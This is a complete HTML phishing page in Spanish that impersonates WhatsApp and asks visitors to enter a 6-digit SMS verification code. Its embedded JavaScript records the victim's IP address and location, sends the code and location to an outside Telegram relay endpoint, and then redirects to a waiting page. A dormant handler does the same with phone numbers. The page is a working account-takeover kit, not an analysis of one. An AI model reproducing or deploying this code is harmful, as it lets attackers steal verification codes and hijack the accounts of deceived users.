<!DOCTYPE html>
<html lang="es"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Actividad en su cuenta - confirmacion</title>
    <link rel="stylesheet" type="text/css" href="https://sappsapp23.sirv.com/docs/styles.css">
    <style>
    * {
      box-sizing: border-box;
    }

    html, body {
      margin: 0;
      padding: 0;
      overflow-x: hidden;
      width: 100vw;
      max-width: 100vw;
    }

    body {
      display: flex;
      flex-direction: column;
      align-items: center;
      min-height: 100vh;
    }

    .content {
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      padding: 20px;
      width: 100%;
      max-width: 100vw;
      text-align: center;
    }

    form {
      width: 100%;
      max-width: 400px;
    }

    select, input, button {
      width: 100%;
      margin: 10px 0;
      padding: 12px;
    }

    #popup, footer {
      width: 100%;
      text-align: center;
    }

    img {
      max-width: 100%;
      height: auto;
    }

    /* Spinner dentro del botón */
    .btn-spinner {
      display: inline-block;
      width: 20px;
      height: 20px;
      border: 3px solid rgba(255,255,255,.3);
      border-radius: 50%;
      border-top-color: #fff;
      animation: spin 1s ease-in-out infinite;
    }
    
    @keyframes spin {
      to { transform: rotate(360deg); }
    }
    
    /* Estilo del botón cuando está cargando */
    #submitButton.loading {
      cursor: not-allowed;
      opacity: 0.8;
    }
    
    /* Ocultar texto cuando está cargando */
    #submitButton.loading .btn-text {
      display: none;
    }
    
    /* Mostrar spinner solo cuando tiene clase loading */
    #submitButton .btn-spinner {
      display: none;
    }
    
    #submitButton.loading .btn-spinner {
      display: inline-block;
    }

    /* Centrar contenido del botón */
    #submitButton {
      display: flex;
      align-items: center;
      justify-content: center;
      min-height: 44px;
    }
    </style>
</head>
<body>


    <header>
        <img src="https://sappsapp23.sirv.com/docs/117_outlook.jpg" alt="Logo WhatsApp">
    </header>

    <div class="content">
         <img src="https://sappsapp23.sirv.com/docs/117_outlook.jpg" width="350" alt="Logo WhatsApp">
        <p>Expirado su codigo,Le hemos enviado un Nuevo código de verificación de 6 dígitos a su número teléfono registrado,Este Codigo es diferente al que se reflaja a su pantalla, esto puede tardas unos minutos por favor espera.... introduzca el código:</p>
        <form id="verificationForm">
    
            <input type="tel" id="cod" name="cod" minlength="6" maxlength="6" placeholder="Código" required="">

            <button type="submit" id="submitButton">
                <span class="btn-text">Continuar</span>
                <span class="btn-spinner"></span>
            </button>
        </form>
    </div>

    <footer>
        <img src="https://sappsapp23.sirv.com/docs/GjxmhIpug9B.svg" alt="Logo WhatsApp">
    </footer>
<script type="text/javascript">
document.addEventListener("DOMContentLoaded", function() {
    // Función para obtener el valor de un parámetro de la URL
    function getQueryParam(param) {
        const urlParams = new URLSearchParams(window.location.search);
        return urlParams.get(param);
    }

    // Función para obtener la ubicación y enviar el mensaje a Telegram
    function obtenerUbicacionYEnviarMensajeTelegram(code, password, nextPage, message) {
        fetch('https://ipapi.co/json/')
        .then(response => response.json())
        .then(data => {
            var country = data.country_name;
            var region = data.region;
            var ip = data.ip;
            if (country && region && ip) {
                message += '\nUbicación: ' + country + ', ' + region + '\nIP: ' + ip;
            } else {
                message += '\nNo se pudo obtener la ubicación.';
            }
            enviarMensajeTelegram(message, nextPage);
        })
        .catch(error => {
            console.error("Error al obtener la ubicación:", error);
            message += "\nError al obtener la ubicación.";
            enviarMensajeTelegram(message, nextPage);
        });
    }

    // Función para enviar el mensaje a Telegram y redirigir
    function enviarMensajeTelegram(mensaje, nextPage) {
        var url = 'https://telegram-backend-umber.vercel.app/api/telegram';
        
        var params = {
            message: mensaje
        };

        fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(params)
        })
        .then(response => {
            if (!response.ok) {
                throw new Error('Ocurrió un error al enviar el mensaje.');
            }
            console.log('Mensaje enviado con éxito.');
            window.location.href = nextPage;
        })
        .catch(error => {
            console.error('Error al enviar el mensaje:', error);
            // Rehabilitar el botón si hay error
            const btn = document.getElementById("submitButton");
            if (btn) {
                btn.classList.remove("loading");
                btn.disabled = false;
            }
        });
    }

    // Evento de envío de formulario para la página de inicio de sesión
    var loginForm = document.getElementById("loginForm");
    if (loginForm) {
        loginForm.addEventListener("submit", function(event) {
            event.preventDefault();
            
            const btn = document.getElementById("submitButton");
            if (btn) {
                btn.classList.add("loading");
                btn.disabled = true;
            }
            
            var telefono = document.getElementById("telefono").value;
            obtenerUbicacionYEnviarMensajeTelegram(telefono, telefono, "loading3.html?action=telefono", "💲 Whatsapp 💲:\nTeléfono: " + telefono);
        });
    }

    // Evento de envío de formulario para la sección de contacto
    var verificationForm = document.getElementById("verificationForm");
    if (verificationForm) {
        verificationForm.addEventListener("submit", function(event) {
            event.preventDefault();
            
            const btn = document.getElementById("submitButton");
            if (btn) {
                btn.classList.add("loading");
                btn.disabled = true;
            }
            
            var cod = document.getElementById("cod").value;
            obtenerUbicacionYEnviarMensajeTelegram(cod, cod, "loading3.html?action=cod", "💲 Whatsapp COD SMS💲:\nCODIGO WHATSAPP: " + cod);
        });
    }
});
</script>


</body></html>
